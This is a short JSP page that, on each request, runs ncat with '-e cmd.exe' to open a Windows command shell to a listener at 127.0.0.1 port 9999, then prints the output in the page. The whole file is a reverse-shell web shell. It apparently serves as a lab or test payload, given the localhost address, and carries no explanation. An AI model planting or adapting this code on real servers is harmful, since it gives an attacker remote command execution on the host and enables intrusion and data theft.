<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %><%
    Process process = Runtime.getRuntime().exec("ncat.exe 127.0.0.1 9999 -e cmd.exe");
    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    String line;
    String result = "";
    while ((line = reader.readLine()) != null) {
        result += "\n" + line;
    }
    pageContext.setAttribute("res", result);
%>

<p>Result: </p>
<p>
    ${res}
</p>